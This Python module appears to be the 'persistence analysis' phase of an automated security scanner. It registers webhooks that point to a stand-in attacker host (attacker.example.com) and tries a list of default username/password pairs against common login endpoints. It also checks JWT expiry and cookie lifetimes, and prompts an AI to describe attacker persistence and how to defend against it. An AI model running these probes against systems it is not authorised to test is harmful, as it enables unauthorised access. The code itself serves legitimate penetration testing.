"""
Phase 18 — Persistence Analysis

In real adversarial simulation you assess what an attacker could leave behind.

Tests:
  1. Token lifetime     — JWT expiry, API key rotation policy hints
  2. Refresh token      — no-rotation, no-revocation on logout, infinite reuse
  3. Webhook            — can an attacker register a persistent webhook?
  4. API key rotation   — are there hints the key never rotates?
  5. Forgotten accounts — admin/test/demo accounts with default/weak credentials
  6. Long-lived sessions — session cookies without expiry or idle timeout
"""
import json
import time
import re
import warnings
import urllib3
import requests
from urllib.parse import urlparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings("ignore", category=urllib3.exceptions.InsecureRequestWarning)

_HEADERS = {"User-Agent": "Mozilla/5.0 (security-scanner)"}

# ---------------------------------------------------------------------------
# Webhook discovery
# ---------------------------------------------------------------------------

_WEBHOOK_PATHS = [
    "/api/webhooks", "/api/webhook", "/api/v1/webhooks",
    "/api/v2/webhooks", "/webhooks", "/webhook",
    "/api/integrations", "/api/notifications",
    "/api/subscriptions", "/api/callbacks",
    "/admin/webhooks", "/settings/webhooks",
    "/api/v1/hooks", "/api/hooks",
]


def _get(url: str, headers: dict = None, timeout: int = 5) -> requests.Response | None:
    try:
        return requests.get(
            url, headers={**_HEADERS, **(headers or {})},
            timeout=timeout, verify=False, allow_redirects=False,
        )
    except Exception:
        return None


def _post(url: str, data: dict, headers: dict = None) -> requests.Response | None:
    try:
        return requests.post(
            url, json=data,
            headers={**_HEADERS, "Content-Type": "application/json", **(headers or {})},
            timeout=5, verify=False, allow_redirects=False,
        )
    except Exception:
        return None


def _probe_webhooks(base_url: str, auth_headers: dict = None) -> list[dict]:
    findings: list[dict] = []
    base = base_url.rstrip("/")
    hdrs = auth_headers or {}

    for path in _WEBHOOK_PATHS:
        url = base + path

        # GET — does the endpoint exist?
        r = _get(url, hdrs)
        if not r or r.status_code not in (200, 201, 400, 401, 403, 405):
            continue

        finding: dict = {
            "issue":    f"Webhook endpoint exists: {path}",
            "severity": "medium",
            "owasp":    "A01",
            "url":      url,
            "status":   r.status_code,
            "detail":   f"Webhook API at {path} responds — test if unauthenticated registration is possible",
        }

        # POST — can we register a webhook to an attacker URL?
        if r.status_code in (200, 201, 405):
            probe_payload = {
                "url":    "https://attacker.example.com/hook",
                "events": ["*"],
                "active": True,
            }
            rp = _post(url, probe_payload, hdrs)
            if rp and rp.status_code in (200, 201, 202):
                finding["severity"] = "high"
                finding["issue"]    = f"Webhook registration accepted: {path}"
                finding["detail"]   = (
                    f"POST {path} returned {rp.status_code} with attacker URL — "
                    "persistent event delivery to attacker possible"
                )
                finding["registration_response"] = rp.text[:200]

        findings.append(finding)

    return findings


# ---------------------------------------------------------------------------
# Forgotten / default accounts
# ---------------------------------------------------------------------------

_DEFAULT_CREDS = [
    ("admin",      "admin"),
    ("admin",      "password"),
    ("admin",      "admin123"),
    ("admin",      "123456"),
    ("admin",      "changeme"),
    ("test",       "test"),
    ("demo",       "demo"),
    ("support",    "support"),
    ("operator",   "operator"),
    ("guest",      "guest"),
    ("user",       "user"),
    ("root",       "root"),
    ("root",       "toor"),
]

_LOGIN_PATHS = [
    "/api/login", "/api/auth/login", "/api/v1/login",
    "/api/v1/auth", "/api/token", "/login",
    "/api/v1/token", "/api/v2/auth/login",
    "/auth/login", "/api/auth/token",
]

_FIELD_NAMES = [
    ("email",    "password"),
    ("username", "password"),
    ("user",     "pass"),
    ("login",    "password"),
    ("email",    "passwd"),
]


def _probe_forgotten_accounts(base_url: str) -> list[dict]:
    """Attempt default credential login on discovered auth endpoints."""
    findings: list[dict] = []
    base = base_url.rstrip("/")

    for path in _LOGIN_PATHS:
        url = base + path
        r_check = _get(url)
        if not r_check or r_check.status_code not in (200, 400, 405, 422):
            continue

        for username, password in _DEFAULT_CREDS[:6]:
            for user_field, pass_field in _FIELD_NAMES[:2]:
                payload = {user_field: username, pass_field: password}
                try:
                    r = requests.post(
                        url, json=payload, timeout=5, verify=False, allow_redirects=False,
                        headers={**_HEADERS, "Content-Type": "application/json"},
                    )
                    # Success indicators: 200 with token/session, or redirect with Set-Cookie
                    if r.status_code in (200, 201):
                        body_lower = r.text.lower()
                        is_success = (
                            "token" in body_lower or
                            "access_token" in body_lower or
                            "session" in body_lower or
                            r.cookies
                        )
                        if is_success:
                            findings.append({
                                "issue":    f"Default credentials accepted: {username}:{password} at {path}",
                                "severity": "critical",
                                "owasp":    "A07",
                                "url":      url,
                                "username": username,
                                "password": password,
                                "status":   r.status_code,
                                "snippet":  r.text[:200],
                                "detail":   f"Login with {username}/{password} succeeded at {path}",
                            })
                            return findings  # stop on first confirmed default cred
                except Exception:
                    continue

    return findings


# ---------------------------------------------------------------------------
# Token lifetime analysis
# ---------------------------------------------------------------------------

def _analyze_token_lifetime(jwt_findings: dict) -> list[dict]:
    """Inspect JWT tokens found during Phase 11 for expiry and rotation issues."""
    issues: list[dict] = []

    for source_url, token_data in jwt_findings.items():
        info = token_data.get("token_info", {})
        if not info:
            continue

        if not info.get("has_exp"):
            issues.append({
                "issue":    "JWT token has no expiry (no 'exp' claim)",
                "severity": "high",
                "owasp":    "A07",
                "url":      source_url,
                "detail":   "Non-expiring tokens remain valid indefinitely — theft = permanent access",
            })

        if not info.get("has_aud"):
            issues.append({
                "issue":    "JWT missing audience claim — cross-service replay possible",
                "severity": "medium",
                "owasp":    "A07",
                "url":      source_url,
                "detail":   "Without 'aud', the token may be accepted by any service in the same ecosystem",
            })

    return issues


# ---------------------------------------------------------------------------
# Long-lived session detection
# ---------------------------------------------------------------------------

def _check_session_longevity(base_url: str) -> list[dict]:
    """Check Set-Cookie headers for missing Max-Age/Expires (session cookies) and long lifetimes."""
    findings: list[dict] = []
    try:
        r = requests.get(base_url, headers=_HEADERS, timeout=6, verify=False, allow_redirects=True)
        raw_cookies = r.headers.get("Set-Cookie", "")
        if not raw_cookies:
            return findings

        cookies = raw_cookies if isinstance(raw_cookies, list) else [raw_cookies]
        for cookie in cookies:
            c = cookie.lower()
            name = cookie.split("=")[0].strip()

            # No expiry = session cookie (dies on browser close, which is fine)
            # but note it if it also has no Secure flag (can be stolen over HTTP)
            if "max-age" not in c and "expires" not in c and "secure" not in c:
                findings.append({
                    "issue":    f"Session cookie '{name}' has no Secure flag and no expiry",
                    "severity": "medium",
                    "owasp":    "A07",
                    "url":      base_url,
                    "detail":   "Cookie without Secure can be stolen over HTTP; also no Max-Age set",
                })

            # Very long max-age (> 30 days)
            m = re.search(r'max-age=(\d+)', c)
            if m:
                age_seconds = int(m.group(1))
                if age_seconds > 86400 * 30:
                    days = age_seconds // 86400
                    findings.append({
                        "issue":    f"Long-lived session cookie '{name}': {days} days",
                        "severity": "medium",
                        "owasp":    "A07",
                        "url":      base_url,
                        "detail":   f"Cookie valid for {days} days — stolen cookie usable for extended period",
                    })

    except Exception:
        pass
    return findings


# ---------------------------------------------------------------------------
# Main entry point
# ---------------------------------------------------------------------------

def run_persistence(
    target: str,
    jwt_findings: dict = None,
    auth_headers: dict = None,
    ai=None,
) -> dict:
    base_url = target if target.startswith("http") else f"https://{target}"

    print("    [*] Persistence: webhook discovery + registration test ...")
    webhook_findings = _probe_webhooks(base_url, auth_headers)

    print("    [*] Persistence: default/forgotten account probe ...")
    default_cred_findings = _probe_forgotten_accounts(base_url)

    print("    [*] Persistence: JWT token lifetime analysis ...")
    token_issues = _analyze_token_lifetime(jwt_findings or {})

    print("    [*] Persistence: session longevity check ...")
    session_issues = _check_session_longevity(base_url)

    all_findings = webhook_findings + default_cred_findings + token_issues + session_issues

    # AI synthesis
    ai_persistence = None
    if ai and ai.is_available() and all_findings:
        summary = json.dumps(
            [{"issue": f["issue"], "severity": f["severity"]} for f in all_findings[:12]],
            indent=2
        )[:1500]
        prompt = (
            "You are a red-team operator assessing persistence opportunities.\n\n"
            f"Target: {target}\n"
            f"Persistence findings:\n{summary}\n\n"
            "For each HIGH/CRITICAL finding:\n"
            "1. Describe how an attacker would maintain persistent access using this\n"
            "2. How long would this access remain undetected?\n"
            "3. What defensive control would eliminate this persistence vector?\n\n"
            "Return ONLY valid JSON array:\n"
            '[{"finding":"...", "persistence_method":"...", "stealth_duration":"...", "defensive_control":"..."}]'
        )
        ai_persistence = ai.ask_json(prompt, model="fast")

    critical = sum(1 for f in all_findings if f.get("severity") == "critical")
    high     = sum(1 for f in all_findings if f.get("severity") == "high")

    return {
        "webhooks":       webhook_findings,
        "default_creds":  default_cred_findings,
        "token_issues":   token_issues,
        "session_issues": session_issues,
        "all_findings":   all_findings,
        "ai_persistence": ai_persistence,
        "summary":        {"total": len(all_findings), "critical": critical, "high": high},
    }
